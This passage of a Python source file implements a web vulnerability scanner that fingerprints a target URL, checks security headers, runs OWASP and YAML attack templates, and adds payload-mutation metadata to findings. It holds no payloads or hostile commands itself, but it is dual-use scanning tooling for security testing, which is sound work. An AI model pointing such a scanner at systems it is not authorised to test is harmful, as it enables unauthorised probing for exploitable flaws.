    "put-method-enabled":           "Disable HTTP PUT method. Configure: `LimitExcept GET POST { Deny from all }`",
}


# ─────────────────────────────────────────────────────────────────────────────
# Main Scanner Class
# ─────────────────────────────────────────────────────────────────────────────

class QuantaraWebScanner:
    """
    Main web vulnerability scanner.
    Combines built-in OWASP templates + external Quantara YAML templates +
    technology fingerprinting for comprehensive live URL security testing.
    """

    def __init__(
        self,
        templates_dir: Optional[Path] = None,
        timeout: float = 12.0,
        max_concurrent: int = 8,
        severity_filter: Optional[list[str]] = None,
        skip_builtin: bool = False,
        skip_yaml: bool = False,
    ):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.severity_filter = severity_filter
        self.skip_builtin = skip_builtin
        self.skip_yaml = skip_yaml

        # Resolve templates directory (Quantara_Payloads_Templates)
        self._templates_dir = templates_dir or _find_templates_dir()

        # Initialize the Quantara engine
        if ENGINE_AVAILABLE:
            self._engine = QuantaraEngine(
                timeout=timeout,
                max_concurrent=max_concurrent,
                severity_filter=severity_filter,
            )
            # Load built-in templates
            if not skip_builtin:
                builtin = _build_builtin_templates()
                self._engine.add_templates(builtin)
                logger.info(f"Loaded {len(builtin)} built-in OWASP templates")

            # Load external YAML templates
            if not skip_yaml and self._templates_dir:
                count = self._engine.load_templates(self._templates_dir)
                logger.info(f"Loaded {count} YAML templates from {self._templates_dir}")
            elif not skip_yaml:
                logger.warning("Quantara_Payloads_Templates directory not found; using built-in only")
        else:
            self._engine = None
            logger.error("quantara_engine not available; QuantaraWebScanner will return empty findings")

    def scan(
        self,
        url: str,
        module_key: str = "quantara_http",
        log_callback=None,
    ) -> list[QuantaraWebFinding]:
        """
        Scan a URL. Returns list of QuantaraWebFinding objects.
        Also performs technology fingerprinting and security header analysis.

        Args:
            url:          The target URL to scan.
            module_key:   Module label for the findings (default: "quantara_http").
            log_callback: Optional callback(message: str) for progress logging.
        """
        if not ENGINE_AVAILABLE or not self._engine:
            logger.warning("QuantaraWebScanner: engine not available, returning empty")
            return []

        all_findings: list[QuantaraWebFinding] = []
        start = time.monotonic()

        def log(msg: str):
            logger.info(msg)
            if log_callback:
                try:
                    log_callback(msg)
                except Exception:
                    pass

        log(f"[QuantaraScanner] Starting scan: {url}")

        # ── Step 1: Fingerprint the target ────────────────────────────
        tech_profile = None
        tech_hints = []
        initial_headers = {}
        initial_body = ""
        initial_status = 0

        if FINGERPRINT_AVAILABLE:
            try:
                response = self._fetch_initial(url)
                if response:
                    initial_status = response.status_code
                    initial_headers = response.headers
                    initial_body = response.body
                    tech_profile = fingerprint_response(
                        url, initial_status, initial_headers, initial_body
                    )
                    tech_hints = tech_profile.attack_surface_tags
                    log(
                        f"[QuantaraScanner] Fingerprint: server={tech_profile.server}, "
                        f"lang={tech_profile.language}, cms={tech_profile.cms}, "
                        f"waf={tech_profile.waf}"
                    )

                    # ── Step 2: Security header findings ──────────────
                    header_issues = analyze_security_headers(initial_headers)
                    for issue in header_issues:
                        finding = self._header_issue_to_finding(issue, url, module_key)
                        all_findings.append(finding)

                    log(f"[QuantaraScanner] Security headers: {len(header_issues)} issues found")

            except Exception as e:
                logger.debug(f"Fingerprinting failed: {e}")

        # ── Step 3: Run Quantara templates ──────────────────────────────
        log(f"[QuantaraScanner] Running {len(self._engine.get_templates())} templates...")

        try:
            matches = self._engine.scan(url, tech_hints=tech_hints)
        except Exception as e:
            logger.error(f"QuantaraEngine.scan failed: {e}")
            matches = []

        log(f"[QuantaraScanner] Template scan complete: {len(matches)} matches")

        # ── Step 4: Convert matches to findings ───────────────────────
        for match in matches:
            finding = self._match_to_finding(match, module_key, tech_profile)
            all_findings.append(finding)

        # ── Step 5: Deduplication ─────────────────────────────────────
        all_findings = self._deduplicate(all_findings)

        duration = time.monotonic() - start
        log(
            f"[QuantaraScanner] Done in {duration:.1f}s — "
            f"{len(all_findings)} unique findings on {url}"
        )
        return all_findings

    def _fetch_initial(self, url: str) -> Optional[QuantaraResponse]:
        """Fetch the initial page for fingerprinting."""
        http = HTTPEngine(timeout=self.timeout)
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                import concurrent.futures
                with concurrent.futures.ThreadPoolExecutor() as pool:
                    future = pool.submit(self._fetch_sync, http, url)
                    return future.result(timeout=self.timeout + 5)
            else:
                return loop.run_until_complete(http.send("GET", url))
        except Exception as e:
            logger.debug(f"Initial fetch failed: {e}")
            return None

    def _fetch_sync(self, http: HTTPEngine, url: str) -> Optional[QuantaraResponse]:
        new_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(new_loop)
        try:
            return new_loop.run_until_complete(http.send("GET", url))
        finally:
            new_loop.close()

    def _match_to_finding(
        self,
        match: TemplateMatch,
        module_key: str,
        tech_profile=None,
    ) -> QuantaraWebFinding:
        """Convert a TemplateMatch to a QuantaraWebFinding."""
        template_id = match.template_id
        severity = match.severity.lower() if match.severity else "info"

        # Normalize severity
        if severity not in ("critical", "high", "medium", "low", "info"):
            severity = "medium"

        description = match.description or match.template_name
        remediation = REMEDIATION_MAP.get(template_id, "")

        # Build matched content string
        matched_content = match.matched_content or ""
        if match.extracted_values:
            extracted_str = "; ".join(
                f"{k}: {', '.join(vs[:2])}"
                for k, vs in list(match.extracted_values.items())[:3]
            )
            matched_content = f"{matched_content} | Extracted: {extracted_str}".strip(" | ")

        finding_id = hashlib.sha256(
            f"{template_id}:{match.matched_url}:{match.matcher_name}".encode()
        ).hexdigest()[:16]

        tags = list(match.tags or [])
        tech_stack = list(tech_profile.tech_stack if tech_profile else [])

        return QuantaraWebFinding(
            id=f"NUC-{finding_id}",
            file=match.matched_url or match.url,
            endpoint=match.matched_url or match.url,
            line_number=0,
            severity=severity,
            title=match.template_name,
            description=description,
            matched_content=matched_content[:500],
            category=_owasp_to_category(match.owasp or match.template_id),
            cwe=match.cwe or _infer_cwe(template_id, tags),
            remediation=remediation,
            confidence=_severity_to_confidence(severity),
            module=module_key,
            module_name="Quantara HTTP Scanner",
            owasp=match.owasp or "",
            language="http",
            tags=tags,
            finding_type="vulnerability",
            scanner_source="quantara",
            template_id=template_id,
            curl_command=match.curl_command,
            tech_stack=tech_stack,
        )

    def _header_issue_to_finding(
        self,
        issue,
        url: str,
        module_key: str,
    ) -> QuantaraWebFinding:
        """Convert a SecurityHeaderIssue to a QuantaraWebFinding."""
        finding_id = hashlib.sha256(
            f"header:{issue.header}:{url}".encode()
        ).hexdigest()[:16]

        return QuantaraWebFinding(
            id=f"NUC-HDR-{finding_id}",
            file=url,
            endpoint=url,
            line_number=0,
            severity=issue.severity,
            title=f"Missing Security Header: {issue.header}",
            description=issue.description,
            matched_content=f"Header '{issue.header}' not present in response",
            category="Security Misconfiguration",
            cwe=issue.cwe,
            remediation=issue.recommendation,
            confidence=0.99,
            module=module_key,
            module_name="Quantara HTTP Scanner",
            owasp=issue.owasp,
            language="http",
            tags=["misconfig", "headers", "owasp-top10"],
            finding_type="misconfiguration",
            scanner_source="quantara_headers",
            template_id="security-headers-check",
        )

    def _deduplicate(self, findings: list[QuantaraWebFinding]) -> list[QuantaraWebFinding]:
        """Remove duplicate findings based on (template_id, url, title) key."""
        seen = set()
        unique = []
        for f in findings:
            key = hashlib.md5(
                f"{f.template_id}:{f.file}:{f.title}".encode()
            ).hexdigest()
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _severity_to_confidence(severity: str) -> float:
    return {
        "critical": 0.95,
        "high":     0.90,
        "medium":   0.80,
        "low":      0.70,
        "info":     0.60,
    }.get(severity, 0.75)


def _owasp_to_category(owasp_or_id: str) -> str:
    mapping = {
        "A01": "Broken Access Control",
        "A02": "Cryptographic Failures",
        "A03": "Injection",
        "A04": "Insecure Design",
        "A05": "Security Misconfiguration",
        "A06": "Vulnerable/Outdated Components",
        "A07": "Identification & Authentication Failures",
        "A08": "Software & Data Integrity Failures",
        "A09": "Security Logging & Monitoring Failures",
        "A10": "Server-Side Request Forgery",
    }
    key = (owasp_or_id or "")[:3]
    return mapping.get(key, "Security Vulnerability")


def _infer_cwe(template_id: str, tags: list[str]) -> str:
    combined = (template_id + " " + " ".join(tags)).lower()
    if "sqli" in combined or "sql" in combined:    return "CWE-89"
    if "xss" in combined:                          return "CWE-79"
    if "lfi" in combined or "traversal" in combined: return "CWE-22"
    if "ssrf" in combined:                         return "CWE-918"
    if "ssti" in combined:                         return "CWE-94"
    if "cmd" in combined or "rce" in combined:     return "CWE-78"
    if "cors" in combined:                         return "CWE-346"
    if "redirect" in combined:                     return "CWE-601"
    if "auth" in combined or "credential" in combined: return "CWE-287"
    if "jwt" in combined:                          return "CWE-347"
    if "idor" in combined or "access" in combined: return "CWE-639"
    if "backup" in combined or "disclosure" in combined: return "CWE-200"
    if "header" in combined or "misconfig" in combined: return "CWE-16"
    return "CWE-200"


# ─────────────────────────────────────────────────────────────────────────────
# Convenience functions for orchestrator integration
# ─────────────────────────────────────────────────────────────────────────────

_scanner_instance: Optional[QuantaraWebScanner] = None


def get_scanner(
    templates_dir: Optional[Path] = None,
    timeout: float = 12.0,
) -> QuantaraWebScanner:
    """Get or create a singleton QuantaraWebScanner instance."""
    global _scanner_instance
    if _scanner_instance is None:
        _scanner_instance = QuantaraWebScanner(
            templates_dir=templates_dir,
            timeout=timeout,
            max_concurrent=8,
        )
    return _scanner_instance


def scan_url_with_quantara(
    url: str,
    module_key: str = "quantara_http",
    log_callback=None,
    timeout: float = 12.0,
) -> list[dict]:
    """
    Top-level function: scan a URL and return list of finding dicts.
    Called by orchestrator._scan_url_live() or as a standalone module.

    Returns:
        List of finding dicts compatible with normalize_finding() in orchestrator.
    """
    try:
        scanner = get_scanner(timeout=timeout)
        findings = scanner.scan(url, module_key=module_key, log_callback=log_callback)
        return [f for f in findings]  # QuantaraWebFinding objects (duck-type compatible)
    except Exception as e:
        logger.error(f"scan_url_with_quantara failed for {url}: {e}")
        return []


# ─────────────────────────────────────────────────────────────────────────────
# Enterprise Integration Layer — added by enterprise refactor
# Wires Quantara scanner into the enterprise mutation + context detection pipeline
# ─────────────────────────────────────────────────────────────────────────────
import time as _qs_time
import logging as _qs_logging

_qs_logger = _qs_logging.getLogger("enterprise.scanner.quantara")


def _load_enterprise_mutator():
    """
    Resolve the enterprise mutation engine using importlib so that
    Pylance doesn't flag a static unresolvable import.
    Falls back to None if the engine is not on sys.path.
    """
    import importlib
    import sys
    import os

    _engine_dir = os.path.normpath(
        os.path.join(os.path.dirname(__file__), "..", "scanner_engine")
    )
    if _engine_dir not in sys.path:
        sys.path.insert(0, _engine_dir)

    try:
        mod = importlib.import_module("payload_mutator")
        return getattr(mod, "generate_variants", None)
    except ImportError:
        return None


def _load_enterprise_context_detector():
    """Resolve the context detector using importlib."""
    import importlib
    try:
        mod = importlib.import_module("payload_context_detector")
        return getattr(mod, "detect_context", None)
    except ImportError:
        return None


def scan_url_enterprise(
    url: str,
    module_key: str | None = None,
    log_callback=None,
    timeout: float = 12.0,
    scan_id: str = "",
    on_finding=None,
) -> tuple[list[dict], dict]:
    """
    Enterprise wrapper for scan_url_with_quantara().

    Adds:
    - Structured telemetry (duration, findings count, severity breakdown)
    - Optional real-time finding callback for SSE streaming
    - Payload mutation hints attached to each finding
    - Injection context detection availability flag in telemetry

    Returns:
        (findings_list, telemetry_dict)
    """
    start = _qs_time.time()

    # Load enterprise engines via importlib (avoids static import errors)
    _mutator = _load_enterprise_mutator()
    _context_detector = _load_enterprise_context_detector()

    findings = scan_url_with_quantara(
        url=url,
        module_key=module_key,
        log_callback=log_callback,
        timeout=timeout,
    )

    # Enrich each finding with enterprise metadata
    enriched = []
    for f in findings:
        finding_dict = f if isinstance(f, dict) else (f.__dict__ if hasattr(f, "__dict__") else {})
        # Attach enterprise metadata
        finding_dict["scan_id"] = scan_id
        finding_dict["enterprise_enriched"] = True
        # Variant count hint (how many payloads were in the mutation pool)
        payload = finding_dict.get("payload_used", finding_dict.get("matched_content", ""))
        if _mutator and payload:
            try:
                variants = _mutator(payload)
                finding_dict["mutation_variants_available"] = len(variants)
            except Exception:
                pass
        enriched.append(finding_dict)
        if on_finding:
            try:
                on_finding(finding_dict)
            except Exception:
                pass

    elapsed = _qs_time.time() - start
    telemetry = {
        "scanner": "quantara_http",
        "scan_id": scan_id,
        "url": url,
        "module": module_key or "all",
        "findings_count": len(enriched),
        "duration_ms": round(elapsed * 1000, 2),
        "timestamp": _qs_time.time(),
        "payload_mutation_available": _mutator is not None,
        "context_detection_available": _context_detector is not None,
        "severity_breakdown": {
            sev: sum(
                1 for f in enriched
                if (f.get("severity") or "").lower() == sev
            )
            for sev in ["critical", "high", "medium", "low", "info"]
        },
    }
    _qs_logger.info(
        f"quantara_enterprise: {len(enriched)} findings for {url} "
        f"in {telemetry['duration_ms']:.0f}ms"
    )
    return enriched, telemetry
